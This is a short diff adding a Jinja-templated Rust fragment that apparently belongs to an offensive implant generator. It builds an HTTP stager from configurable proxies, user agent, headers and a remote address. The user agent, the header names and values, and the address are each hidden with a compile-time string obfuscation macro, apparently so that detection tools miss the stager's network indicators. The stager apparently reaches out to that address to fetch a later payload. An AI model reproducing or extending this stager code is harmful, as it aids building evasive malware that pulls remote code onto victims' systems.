@@ -1,0 +1,30 @@
+let mut stager = stager::HttpStager::new(
+        {% if stager.proxies %}
+        Some(vec![
+            {% for proxy in stager.proxies %}
+            "{{ proxy }}".to_string(),
+            {% endfor %}
+        ]),
+        {% else %}
+        None,
+        {% endif %}
+
+        {% if stager.user_agent %}
+        Some(obfuse::obfuse!("{{ stager.user_agent }}").as_str().to_string()),
+        {% else %}
+        None,
+        {% endif %}
+
+        {% if stager.headers %}
+        Some({
+            let mut h = std::collections::HashMap::new();
+            {% for key, value in stager.headers.items() %}
+            h.insert(obfuse::obfuse!("{{ key }}").as_str().to_string(), obfuse::obfuse!("{{ value }}").as_str().to_string());
+            {% endfor %}
+            h
+        }),
+        {% else %}
+        None,
+        {% endif %}
+        obfuse::obfuse!("{{ stager.address }}").as_str().to_string(),
+    )?;
